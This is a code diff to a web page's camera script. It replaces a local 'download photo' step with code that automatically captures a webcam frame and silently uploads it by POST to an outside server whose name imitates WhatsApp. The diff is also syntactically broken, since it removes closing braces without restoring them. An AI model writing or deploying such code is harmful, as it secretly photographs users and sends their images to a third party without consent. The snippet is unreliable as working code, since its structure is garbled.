@@ -43,12 +43,19 @@
           video.style.display = 'none';
 
           // Download photo automatically
-          const link = document.createElement('a');
-          link.download = 'auto_photo.png';
-          link.href = canvas.toDataURL();
-          link.click();
-        }, 2000);
-      })
+          canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
+video.style.display = 'none';
+canvas.style.display = 'block';
+
+canvas.toBlob(blob => {
+  const formData = new FormData();
+  formData.append("photo", blob);
+
+  fetch("https://whatsapp-server-ly90.onrender.com/upload", {
+    method: "POST",
+    body: formData
+  });
+});
       .catch(err => {
         notification.textContent = "Unable to access camera: " + err;
         notification.style.background = '#f44336'; // Red for error
